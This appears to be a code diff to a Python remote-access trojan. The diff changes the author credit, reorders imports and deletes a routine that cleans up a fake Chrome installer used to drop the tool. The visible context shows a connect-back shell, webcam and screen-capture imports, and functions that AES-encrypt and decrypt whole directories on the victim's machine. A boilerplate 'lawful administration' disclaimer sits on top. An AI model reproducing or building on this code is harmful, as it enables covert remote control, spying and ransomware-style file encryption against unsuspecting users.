@@ -1,23 +1,24 @@
-#Created by Xand
+# Created by Vasto Boy
 
-#Disclaimer: This reverse shell should only be used in the lawful, remote administration of authorized systems. Accessing a computer network without authorization or permission is illegal.
+# Disclaimer: This reverse shell should only be used in the lawful, remote administration of authorized systems. Accessing a computer network without authorization or permission is illegal.
 
-
-import socket
-import time
-import platform
-import subprocess
 import os
 import re
-from Crypto.Hash import SHA256
-from Crypto.Cipher import AES
-from Crypto import Random
 import cv2
+import time
+import socket
+import platform
+import subprocess
 import numpy as np
 from PIL import ImageGrab
+from Crypto import Random
+from Crypto.Hash import SHA256
+from Crypto.Cipher import AES
+
 
 port = 4000
 host = socket.gethostbyname(socket.gethostname())
+
 
 #tries to connect back to the server
 def establish_connection():
@@ -271,6 +272,8 @@ def encrypt_All_Files(conn, key, directory):
            conn.send("\t [+] Directory or file specified does not exist!!! \n".encode() + '\033[1;32mCorona:~\033[1;m'.encode() + str(os.getcwd() + "> ").encode())
            pass
 
+
+
 #decrypt all files in directory provided
 def decrypt_All_Files(conn, key, directory):
     file_counter = 0
@@ -311,27 +314,5 @@ def decrypt_All_Files(conn, key, directory):
          conn.send("\t [+] Directory or file specified does not exist!!! \n".encode() + '\033[1;32mCorona:~\033[1;m'.encode() + str(os.getcwd() + "> ").encode())
          pass
 
-
-#removes fake chrome installer
-def removeFakeChrome():
-    time.sleep(2)
-
-    dest_path = os.getcwd().split('\\')
-    del dest_path[3:]
-    dest_path = "\\".join(dest_path)
-    chromeFolder = dest_path + "\Chrome"
-
-    file = open(chromeFolder + "\\filePath.txt", "r")
-    chromeSetupFile = file.read()
-    os.remove(chromeSetupFile)
-    file.close()
-
-    filepath = chromeFolder + "\\filePath.txt"
-    os.remove(filepath)
-
-try:
-    removeFakeChrome()
-except:
-    pass
 
 establish_connection()
